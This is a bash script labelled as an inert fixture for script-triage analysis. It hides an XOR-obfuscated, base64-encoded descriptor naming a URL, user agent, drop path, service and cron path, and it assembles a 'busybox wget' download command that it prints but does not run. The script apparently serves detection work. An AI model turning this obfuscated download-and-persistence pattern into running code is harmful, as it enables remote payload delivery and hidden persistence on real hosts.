#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_738bc7b6='pJmo1KfTtsa1iOmK+47nlfCv3bjVus6rh/CC65/6pcOqxqPfvtq7y7/aqJX3gvGI6oX9otWy16P8k+aS4pfjn+yY+Z77pMeo3bPH+su31LXYqMmgx6n2n/vGpcSp2bjRttj1xfbB+Z+ty66Wot6r2bWI4JTgkOPZ9tnp2u3Vs4HngrqOoMW93LHBrcjmj+GX9przl7jav9nhgLaE5cu40KzZqs+94oPkge+bpu6b9YHzluWW2rvZ9sb1wvqcrsitlaHdu9K+24T0leGJtJvvgvLdtcCu2qjNvs3gg+KB6Yyjjf6K64zpxPTH8MiunPqfp5M='
readonly Codec_738bc7b6='base64_literal|rolling_xor|d2'

Load_738bc7b6() {
  EnCoDeD_Bytes=()
  local PaRt
  while read -r PaRt; do [[ -n "$PaRt" ]] && EnCoDeD_Bytes+=("$PaRt"); done < <(printf '%s' "${Material_738bc7b6}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_738bc7b6() {
  DeCoDeD_Bytes=()
  local PrEvIoUs=210
  local InDeX
  for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
    DeCoDeD_Bytes+=("$((EnCoDeD_Bytes[InDeX] ^ PrEvIoUs))")
    PrEvIoUs=${EnCoDeD_Bytes[InDeX]}
  done
}

Recover_738bc7b6() {
  local -a EnCoDeD_Bytes DeCoDeD_Bytes
  local DeScRiPtOr_Text NeUtRaL PaSs InDeX
  NeUtRaL="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_738bc7b6
  Decode_738bc7b6
  DeScRiPtOr_Text=''
  local octal character
  for InDeX in "${!DeCoDeD_Bytes[@]}"; do
    printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
    printf -v character '%b' "\\$octal"
    DeScRiPtOr_Text+="$character"
  done
  printf '%s\n' "$DeScRiPtOr_Text"
}

Inspect_738bc7b6() { local recovered; recovered="$(Recover_738bc7b6)"; printf '%s\n' "$recovered"; }

Plan_738bc7b6() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_738bc7b6)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(busybox wget -qO "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_738bc7b6; fi
